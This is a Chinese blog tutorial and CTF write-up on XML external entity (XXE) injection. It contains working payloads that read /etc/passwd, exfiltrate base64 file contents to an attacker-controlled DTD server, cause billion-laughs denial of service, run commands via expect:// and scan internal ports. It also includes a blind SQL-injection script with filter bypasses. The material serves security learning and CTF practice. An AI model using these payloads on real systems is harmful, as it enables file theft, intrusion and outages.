---
layout:     post
title:      XXE
subtitle:   XML外部实体注入攻击
date:       2018-12-01
author:     Wh0ale
header-img: img/12s.jpg
catalog: true
tags:
    - 圈子
    - xxe

---

# XXE(XML External Entity attack)XML外部实体注入攻击

## 0x01导语

　　XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的simplexml_load 默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string（）。

　　尽管XXE漏洞已经存在了很多年，但是它从来没有获得它应有的关注度。很多XML的解析器默认是含有XXE漏洞的，这意味着开发人员有责任确保这些程序不受此漏洞的影响。 比如今年7月刚爆出的[微信支付XXE漏洞](http://seclists.org/fulldisclosure/2018/Jul/3)案例。

　　libxml2.9.1及以后，默认不解析外部实体。可以[在此](https://github.com/GNOME/libxml2/commits)了解libxml各版本具体改动情况。本次测试在Window下使用的php5.4.45(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。当XML声明中standalone值是yes的时候表示DTD仅用于验证文档结构，外部实体将被禁用。但它的默认值是no，而且有些parser会直接忽略这一项。

## 0x02XML实体

什么是实体？

> 实体是对数据的引用；根据实体种类的不同，XML 解析器将使用实体的替代文本或者外部文档的内容来替代实体引用。

实体，个人理解是定义一个xml变量或者宏，并且对其进行赋值。

XML中实体类型，大致有下面几种：

- 字符实体
- 内部实体（命名实体）
- 外部实体
- 参数实体

除参数实体外，其它实体都以字符`&`开始，实体名，以字符`;`结束

### 1.字符实体

对于字符实体，我们可以用十进制格式（&#nnn;，其中 nnn 是字符的十进制值）或十六进制格式（&#xhhh;，其中 hhh 是字符的十六进制值）

比如`&#x25;`表示`%`

###　2.内部实体

内部实体又称为命名实体。内部实体可以说成是变量声明，内部实体只能声明在DTD或者XML文件开始部分（<!DOCTYPE>语句中）。

内部实体xml代码：

Content-Type的值为**application/xml**

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE joychou [
    <!ENTITY param "hello">
]>
<root>&param;</root>
```

解析php代码：（下面所有解析xml代码以及漏洞测试均为该段代码，除非特别申明）

```php
<?php
$content = file_get_contents("php://input");
$xml = simplexml_load_string($content);
echo $xml;
?>
```

解析结果：`hello`

### 3.外部实体

外部实体申明：`<!ENTITY 实体名 SYSTEM "URI/URL">`
外部实体引用：`&实体名;`

外部实体语法：

```xml
<!DOCTYPE filename
[
    <!ENTITY entity-name SYSTEM "URI/URL">
]>
```

外部实体xml代码：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE joychou
[
    <!ENTITY xxe SYSTEM "http://www.sectest.com:8082/xxe.txt" >
]>
<root>&xxe;</root>
```

xxe.txt文件内容：

```
[root@centos html]# cat xxe.txt 
I'm JoyChou
```

解析xml后的内容为：`I'm JoyChou`

### 4.参数实体

参数实体用于DTD和文档的内部子集中。与一般实体相比它以字符（%）开始，以字符（;）结束。只有在DTD文件中才能在参数实体声明的时候引用其他实体。（blind xxe使用的方法）

参数实体申明：`<!ENTITY % 实体名 "实体内容">`
参数实体引用：`%实体名;`

参数实体xml代码：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE joychou 
[ 
    <!ENTITY % remote SYSTEM "http://www.sectest.com:8082/xxe.dtd">
    %remote;
]>
<root>&b;</root>
```

xxe.dtd文件内容：

```
<!ENTITY b SYSTEM "file:///c:/windows/win.ini">
```

上面那段代码优化下等于下面这段代码：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE joychou 
[ 
    <!ENTITY b SYSTEM "file:///c:/windows/win.ini">
]>
<root>&b;</root>
```

两段代码都是获取win.ini文件内容。

## 0x03XXE的攻击与危害

　　当我们了解清楚以上的信息后，我们就能理解如何构造外部实体注入攻击与它的危害性了。

### 1.如何构造外部实体注入攻击

　　一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。

#### ①有回显的payload写法

1. 直接通过DTD外部实体声明。XML内容如下：

   ```php
   <?xml version="1.0"?>
   <!DOCTYPE ANY [
       <!ENTITY test SYSTEM "file:///etc/passwd">
   ]>
   <abc>&test;</abc>
   ```

2. 通过DTD文档引入外部DTD文档，再引入外部实体声明。XML内容如下：

   ```php
   <?xml version="1.0"?>
   <!DOCTYPE a SYSTEM "http://localhost/evil.dtd">
   <abc>&b;</abc>
   ```

   evil.dtd内容：

   ```php
   <!ENTITY b SYSTEM "file:///etc/passwd">
   ```

3. 通过DTD外部实体声明引入外部实体声明。XML内容如下:

   ```php
   <?xml version="1.0"?>
   <!DOCTYPE a [
       <!ENTITY % d SYSTEM "http://localhost/evil.dtd">
   %d;
   ]>
   <abc>&b;</abc>
   ```

   evil.dtd内容：

   ```php
   <!ENTITY b SYSTEM "file:///etc/passwd">
   ```

   但是如果想通过如下声明是不可以的：

   ```php
   <?xml version="1.0"?> 
   <!DOCTYPE a [
   <!ENTITY d SYSTEM "http://localhost/evil.xml">
   ]>
   <abc>&d;</abc>
   ```

   测试发现这种实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，参数实体就好用很多。

#### **②无回显的payload写法：**

1. 第一种无回显示payload写法：

   ```php
   <?xml version="1.0"?> 
   <!DOCTYPE a [
   <!ENTITY % file SYSTEM "file:///c://test/1.txt">
   <!ENTITY % dtd SYSTEM "http://localhost/evil.xml"> 
   %dtd; %all; 
   ]> 
   <abc>&send;</abc>
   ```

   其中evil.xml文件内容为

   ```php
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost%file;'>">
   ```

   调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用实体send。

2. 第二种无回显payload写法：

   ```php
   <?xml version="1.0"?>
   <!DOCTYPE a [
   <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/test/1.txt">
   <!ENTITY % dtd SYSTEM "http://localhost/evil.xml">
   %dtd;
   %send;
   ]>
   <abc></abc>
   ```

   其中evil.xml文件内容为：

   ```php
   <!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>"> %payload;
   ```

   调用过程和第一种方法类似，但最里层的嵌套里`%`要进行实体编码成`&#x25;`。无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。

　　这里注意参数实体引用`%file;`必须放在外部文件里，因为根据这条 [规则](https://www.w3.org/TR/xml/#wfc-PEinInternalSubset) 。在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错： `PEReferences forbidden in internal subset`。这里的`internal subset`指的是中括号`[]`内部的一系列元素声明，`PEReferences` 指的应该是参数实体引用 `Parameter-Entity Reference` 。

　　一般都使用第二种方法，因为当文件中含有中文字符或`<`字符，会导致不能解析。

### 2.XXE带来的危害

　　利用xxe漏洞可以进行文件读取，拒绝服务攻击，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等。内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用**xxe进行SSRF**的利用，基本上啥都能做。

　　首先准备一个有XXE漏洞的文件，本次测试以php为主：

```php
<?php
$xml = simplexml_load_string($_REQUEST['xml']);
echo "<pre>" ;
print_r($xml);//注释掉该语句即为无回显的情况
?>
```

#### **危害1.读取任意文件**

有回显情况:

```php
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY test SYSTEM "file:///E://phpStudy/PHPTutorial/WWW/etc/passwd.txt">
]>
<abc>&test;</abc>
```

![mark](http://oxwj17r3u.bkt.clouddn.com/blog/180814/bimLEgHLEg.png?imageslim)

无回显情况:

　　本次测试用的phpStudy，需[开启apache日志记录](https://blog.csdn.net/fgdfgasd/article/details/17010429)并重启服务。当无回显情况时，可以讲数据发送到远程服务器。

```php
<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=E://phpStudy/PHPTutorial/WWW/etc/passwd.txt">
<!ENTITY % dtd SYSTEM "http://localhost/evil.xml">
%dtd;
%send;
]>
<abc></abc>
```

远程服务器部署evil.xml内容为:

```php
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>"> %payload;
```

`YWRtaW46OnBhc3N3b3JkIQ0KdGVzdDo6cGFzc3dkIQ==`Base64解码即可。

　　通过此方法可以读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件、获取帐号密码后进一步攻击。如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。

#### **危害2.拒绝服务攻击**

```php
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

　　此示例就是著名的[Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)该攻击是通过创建一项递归的 XML 定义，在内存中生成十亿个"Ha！"字符串，从而导致 DoS 攻击。

　　原理：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。

#### **危害3.远程命令(代码)执行**

```php
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY test SYSTEM "expect://id">
]>
<abc>&test;</abc>
```

　　此示例是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能有此漏洞。

#### **危害4.内网信息探测**

　　利用http协议http://url/file.ext，替换标准poc中相应部分即可,这种情况比较不稳定，根据不同xml解析器会得到不同的回显报错结果。

有回显情况：

```php
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY test SYSTEM "http://127.0.0.1:87/tets.txt">
]>
<abc>&test;</abc>
```

　　当端口开放时，如80端口：
![mark](http://oxwj17r3u.bkt.clouddn.com/blog/180814/9fDK6HBd22.png?imageslim)

　　当端口未开放时，如81端口:
![mark](http://oxwj17r3u.bkt.clouddn.com/blog/180814/cd6DKJ1LH9.png?imageslim)

无回显情况：

```php
<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=http://127.0.0.1:81/">
<!ENTITY % dtd SYSTEM "http://localhost/evil.xml">
%dtd;
%send;
]>
<abc></abc>
```

远程服务器部署evil.xml内容为:

```php
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>"> %payload;
```

　　观察日志文件即可。

　　当端口开放时，如80端口:
![mark](http://oxwj17r3u.bkt.clouddn.com/blog/180814/L7h4EkHCd0.png?imageslim)

　　当端口未开放时，如81端口:

　　有的无回显的情况还可以通过抓包看响应头返回的状态码，返回的报错信息等判断。

#### **危害5.攻击内网网站**

难得搭建环境，就直接引用网上的例子吧：

![mark](http://oxwj17r3u.bkt.clouddn.com/blog/180814/JKjfmEHDgJ.png?imageslim)

这个示例是攻击内网strusts2网站，远程执行系统命令。

还可部署bash文件建立监听，获得反弹shellcode等。

由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。

## 0x04CTF题目

　　本人是个CTFer，所以再结合两道CTF题目，更加深入理解此攻击。

### 1.JarvisOJ——api调用

> 请设法获得目标机器/home/ctf/flag.txt中的flag值。
>
> 题目入口：<http://web.jarvisoj.com:9882/>

先查看源码：
再看响应:
![mark](http://oxwj17r3u.bkt.clouddn.com/blog/180814/ImFGD6b7ga.png?imageslim)
　　开始以为是考反序列化，但根据提示和结果发现不是。这个页面仅仅是向后台发送请求，后台再响应返回几个特定的字符串，修改请求值，发现返回与前台的输入没多大关系。最后，知道是XXE。

　　这道题目，默认的是json格式传递，因此首先我们更改Content-Type的值为**application/xml**，然后传入xml代码：

```php
<?xml version=”1.0″?>
<!DOCTYPE a[
<!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt">]>
<abc>&xxe;</abc>
```

### 2.DDCTF——喝杯Java冷静下

> <http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/>
>
> 提示：第二层关卡应用版本号为2.3.1

此题目有点难，由于技术不到位，有的地方不是很清楚就不误导读者了。

直接看看大佬的姿势吧：

[DDCTF2018 WEB6 喝杯Java冷静下 WRITEUP](http://www.lz1y.cn/archives/1403.html) —— LZ1Y

[DDCTF 2018 Web Writeup](https://www.secpulse.com/archives/71113.html) —— 白帽100安全攻防实验室

### 3. 从sql注入到xslt再到xxe · Xslt

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyptfu1e46j20ld0lmjsx.jpg)



分别是
1.新建笔记
2.生成xml文件
3.将生成的xml文件导出为html文件
于是开始随意尝试
**第一个想法：**
是不是flag在管理员的笔记里呢？我只要登入管理员账号即可？
于是开始尝试在登录和注册处进行sql注入
发现未果,后台对注入处理比较完善
会过滤了union,select，空格等多种必要符号
随即暂且放弃了这个想法。
**第二个想法：**
新建笔记可否写xml，进行xxe攻击呢，或者xss？
尝试了一下`<script>`

容易发现转义`accordion-content">&lt;script&gt;</div></dd></dl></section>`

尝试绕过也未果，这个想法也破灭。
于是开始分析题目流程
1.注册账号
2.登录账号
3.新建笔记
4.生成xml文件
5.导出为html
我们思考一下后面3个步骤的实现：
新建笔记：将我们的输入经过处理存入数据库
生成xml文件：根据我们的用户名查询我们数据库里的content，并根据content生成xml文件
导出为html：将xml文件转换为html的形式显示出来
那么问题来了，如何将xml文件转换为html的形式？
这里就涉及到了新的知识点：XSLT

> XSL（可扩展样式表语言）是一种用于转换XML文档的语言。XSLT代表XSL转换。XSL转换本身就是XML文档。
> 转换的结果可以是不同的XML文档或其他内容，如HTML文档，CSV文件或纯文本文件。

xml文件如下

  ```
<?xml version="1.0" ?>
<fruits>
  <fruit>
    <name>Lemon</name>
    <description>Yellow and sour</description>
  </fruit>
  <fruit>
    <name>Watermelon</name>
    <description>Round, green outside, red inside</description>
  </fruit>
</fruits>
  ```

如果要将这个xml文件转换为纯文本格式，可以使用如下xsl转换

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    Fruits:
    <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

转换后结果

```
Fruits:

      - Lemon: Yellow and sour
      - Waterm
```

xslt的相关攻击

由于xslt的文档格式为xml，所以存在xml相关的攻击 比如常见的xml引入外部实体，可以读取文件的问题
 这里就不详细介绍了，因为一会儿还要实战

**思考攻击点**

学习过xslt相关知识后，很容易看出这个题目的考点
 但是新的问题来了
 xslt的攻击是在xml文件转换为其他文档格式的时候触发的，那我们的xml文件从哪里来呢？
 现在无非两个思路
 1.新建笔记的时候插入xml文件
 2.直接sql注入插入content，内容为xml文件
 第一个思路显然没有办法，因为在新建笔记插入文件的时候会经过转义处理，再次转换的时候无法引入我们想要的攻击构造
 而第二个思路却没有注入点，应该如何是好？
 在苦思冥想之际，我发现了两个神奇的点：

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyptkt8yfij20j803vdfw.jpg)

如图，首先是xml文件名，我惊奇的发现竟然就是自己用户名的md5,
于是我尝试了一下admin的xml文件，即：
./xml/21232f297a57a5a743894a0e4a801fc3.xml
发现hint

```
<notes>
<item>
<id>1</id>
<title size="1">学习记录</title>
<content>It's so easy to use xslt to parse xml.</content>
<id>2</id>
<title size="2">flag</title>
<content>flag在./flag.php文件</content>
</item>
</notes>
```

可以更加肯定的证明，我们的猜想是正确的，的确是xslt攻击引入xml去读取./flag文件
然后我又发现了模板一和模板二的问题
这看似多此一举的操作，其实是预留下了sql注入的隐患
我们抓包

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyptmf5o6xj20j9051glt.jpg)

发现template是以Post方式提交的，于是我在此尝试了一下注入，这里我选择hackbar，方便回显
当template为1时，发现正常回显

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyptnkfu5wj20j806ht8r.jpg)

于是我确定此处存在注入问题
随即fuzz了一下，发现会过滤空格和许多关键词但是容易发现这样的漏洞,比如:
union会被过滤
但是我输入
un和ion不会过滤
那么我们输入un ion即可成功构造出union
因为空格被过滤的原因，un和ion成功合并在一起
于是我们可以利用这个方法突破关键词过滤
而后经过fuzz，发现/**/可以绕过空格过滤
于是我开始随手尝试

```
template=1/**/o r der/**/b y/**/1
```

成功回显

```
template=1/**/o r der/**/b y/**/2
```

无回显,说明只有一列数据,但是当我尝试

```
template=0/**/uni on/**/sel ect/**/0/**/li mit/**/1
```

回显为模板不存在
这是为什么呢？
经过我的猜测，查询语句可能如下：

```select
content from users where template=1
```

我们union
select可以填充content，但是必须符合xml语法，否则无法转换，所以无回显
所以整体攻击思路相当明显了
1.利用union select填充我们构造的恶意content
2.xslt对我们填充的恶意content进行转换
3.触发攻击，引入外部实体
4.读取flag

**攻击构造**

清楚了攻击点后，我写了脚本，查看admin的content，以确保xml格式的吻合性， 为防止处理问题，我还将content转换为十六进制输出。

```python
# -*- coding: utf-8 -*-
import requests
import string
import urllib
cookie = {
"PHPSESSID":"e51d34c56f1d02e0eace44a7988ae1ec"
}
url = "题目ip/report.php"
flag = "3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d227574662d38223f3e"
true_flag = """<?xml version="1.0" encoding="utf-8"?>"""
for i in range(1,1000):
    payload = flag
    for j in range(1,127):
        if chr(j) in '''_%''':
            continue
        if len(hex(ord(chr(j)))[2:]) == 1:
            lll = '0'+hex(ord(chr(j)))[2:]
        else:
            lll = hex(ord(chr(j)))[2:]
        # print lll
        data = {
            "template":urllib.unquote("0/**/o r/**/content/**/li ke/**/bin ary/**/0x%s25/**/li mit/**/1/**/off set/**/0"%(payload+lll))
        }
        r =requests.post(url=url,data=data,cookies=cookie)
        if '模板不存在' not in r.content:
            flag += lll
            true_flag += chr(int('0x'+lll,16))
            print true_flag
            print flag
            break
```

最后成功得到admin的content内容：

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/notes">
    <xsl:for-each select="item">
      <section data-am-widget="accordion" class="am-accordion am-accordion-gapped">
      <dl class="am-accordion-item am-active">
        <dt class="am-accordion-title">
           <xsl:value-of select="id"/>. <xsl:value-of select="title"/>
        </dt>
        <dd class="am-accordion-bd am-collapse am-in">
          <div class="am-accordion-content">
                <xsl:value-of select="content"/>
          </div>
        </dd>
      </dl>
  </section>

    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

为确保准确性，我尝试它是否会来请求我的vps

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "http://我的vps:23333">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/notes">
   Notes &ext_file;:
    <xsl:for-each select="item">
      <section data-am-widget="accordion" class="am-accordion am-accordion-gapped">
      <dl class="am-accordion-item am-active">
        <dt class="am-accordion-title">
           <xsl:value-of select="id"/>. <xsl:value-of select="title"/>
        </dt>
        <dd class="am-accordion-bd am-collapse am-in">
          <div class="am-accordion-content">
                <xsl:value-of select="content"/>
          </div>
        </dd>
      </dl>
  </section>

    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

并且在自己的23333端口监听，得到:

```
root@ubuntu-512mb-sfo2-01:~# nc -l -vv -p 23333
Listening on [0.0.0.0] (family 0, port 23333)
Connection from [题目ip] port 23333 [tcp/*] accepted (family 2, sport 56744)
GET / HTTP/1.0
Host: 我的ip:23333
Connection: close
```

发现请求成功！
于是我根据这个文件直接插入标准的xxe攻击格式

```<?xml
version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY[
  <!ENTITY % r SYSTEM "<http://>你的vps/xxe.xml">
  %r;
  %all;
  %s;
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template
match="/notes">
   Notes &ext_file;:
    <xsl:for-each
select="item">
      <section
data-am-widget="accordion" class="am-accordion
am-accordion-gapped">
      <dl
class="am-accordion-item am-active">
        <dt
class="am-accordion-title">
           <xsl:value-of
select="id"/>. <xsl:value-of
select="title"/>
        </dt>
        <dd
class="am-accordion-bd am-collapse am-in">
          <div
class="am-accordion-content">
                <xsl:value-of
select="content"/>
          </div>
        </dd>
      </dl>
  </section>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

并转换为16进制

```
0x3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d227574662d38223f3e0a3c21444f435459504520414e595b0a20203c21454e54495459202520722053595354454d2022687474703a2f2f3132372e302e302e312f7878652e786d6c223e0a202025723b0a202025616c6c3b0a202025733b0a5d3e0a3c78736c3a7374796c6573686565742076657273696f6e3d22312e302220786d6c6e733a78736c3d22687474703a2f2f7777772e77332e6f72672f313939392f58534c2f5472616e73666f726d223e0a20203c78736c3a74656d706c617465206d617463683d222f6e6f746573223e0a2020204e6f74657320266578745f66696c653b3a0a202020203c78736c3a666f722d656163682073656c6563743d226974656d223e0a2020202020203c73656374696f6e20646174612d616d2d7769646765743d226163636f7264696f6e2220636c6173733d22616d2d6163636f7264696f6e20616d2d6163636f7264696f6e2d676170706564223e0a2020202020203c646c20636c6173733d22616d2d6163636f7264696f6e2d6974656d20616d2d616374697665223e0a20202020202020203c647420636c6173733d22616d2d6163636f7264696f6e2d7469746c65223e0a20202020202020202020203c78736c3a76616c75652d6f662073656c6563743d226964222f3e2e203c78736c3a76616c75652d6f662073656c6563743d227469746c65222f3e0a20202020202020203c2f64743e0a20202020202020203c646420636c6173733d22616d2d6163636f7264696f6e2d626420616d2d636f6c6c6170736520616d2d696e223e0a202020202020202020203c64697620636c6173733d22616d2d6163636f7264696f6e2d636f6e74656e74223e0a202020202020202020202020202020203c78736c3a76616c75652d6f662073656c6563743d22636f6e74656e74222f3e0a202020202020202020203c2f6469763e0a20202020202020203c2f64643e0a2020202020203c2f646c3e0a20203c2f73656374696f6e3e0a0a202020203c2f78736c3a666f722d656163683e0a20203c2f78736c3a74656d706c6174653e0a3c2f78736c3a7374796c6573686565743e
```

然后进行union填充

```
# 题目ip - - [19/Mar/2018:00:42:24 +0000] "GET /12345.php?f=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAzOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwNDpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA1OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDY6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UK HTTP/1.0" 200 166 "-" "-"
```

成功读取了/etc/passwd的内容
于是最终成功获得./flag的内容

```
# 题目ip - - [19/Mar/2018:00:43:57 +0000] "GET /12345.php?f=PD9waHAgCiRmbGFnID0gImdyZWVuezdiMTJkZjdmYjQ0Y2Y4NGQ5ODliMjFkNmI2YWFhZThjfSI7Cg== HTTP/1.0" 200 166 "-" "-"
```

得到flag

```php
<?php 
$flag = "green{7b12df7fb44cf84d989b21d6b6aaae8c}";
```

## 0x05真实案例

- [微信支付XXE漏洞](http://seclists.org/fulldisclosure/2018/Jul/3) 再提一次刚爆出的微信XXE漏洞，还可以欣赏一篇对[此漏洞的修复文章](http://www.freebuf.com/vuls/176837.html)。

- 在线文件预览引起的问题，修改docx文件的word/document.xml，添加DTD和实体引用，即可触发，可据此生成恶意的Word文档。

  1. [WooYun-2014-73321（网易邮箱某处XXE可读取文件）](http://www.anquan.us/static/bugs/wooyun-2014-073321.html)
  2. [WooYun-2014-73439（QQ邮箱XXE可读取任意文件）](http://www.anquan.us/static/bugs/wooyun-2014-073439.html)

  ......

- 直接处理POST XML数据。许多都是直接 simplexml_load_string() 处理POST进来的数据。可控字符串出现在XML文件里就要引起注意。

  1. [WooYun-2015-109725（中通某处XXE漏洞可读取服务器任意文件）](http://www.anquan.us/static/bugs/wooyun-2015-0109725.html)

  ......

- XML处理工具

  1. [WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）](http://www.anquan.us/static/bugs/wooyun-2014-059911.html)格式化XML。
  2. [WooYun-2015-134057（百度某平台Blind XXE漏洞&可Bool型SSRF攻击）](http://www.anquan.us/static/bugs/wooyun-2015-0134057.html)XML检查工具。
  3. [WooYun-2015-135397（搜狗某平台Blind XXE漏洞(读取文件/SSRF/Struts2命令执行) ](http://www.anquan.us/static/bugs/wooyun-2015-0135397.html)XML检查工具。

- [WooYun-2014-58381（百度某功能XML实体注入）](http://www.anquan.us/static/bugs/wooyun-2014-058381.html)该功能点提供svg转jpg服务，通过构造特殊svg文件注入。

- [WooYun-2014-59783（百度某功能XML实体注入（二））](http://www.anquan.us/static/bugs/wooyun-2014-059783.html)在第一次修复后只过滤了ENTITY这个词，DTD 本身就支持调用外部的DTD文件，因此我们只需要在svg里加一个外部的DTD就绕过了。

- [WooYun-2014-74069（鲜果网RSS导入Blind XXE漏洞 ）](http://www.anquan.us/static/bugs/wooyun-2014-074069.html)导入OPML文件。

- [WooYun-2015-111828（博客园某处XXE可下载任意文件）](http://www.anquan.us/static/bugs/wooyun-2015-0111828.html)博客搬家功能，导入XML。

- [WooYun-2015-117316（用友人力资源管理软件全版本XXE漏洞 ）](http://www.anquan.us/static/bugs/wooyun-2015-0117316.html)登陆与重置密码时使用XML传输数据。

- [WooYun-2015-148793（AOL Website XML External Entity(XXE) Vulnerability）](http://www.anquan.us/static/bugs/wooyun-2015-0148793.html)xmlrpc service。

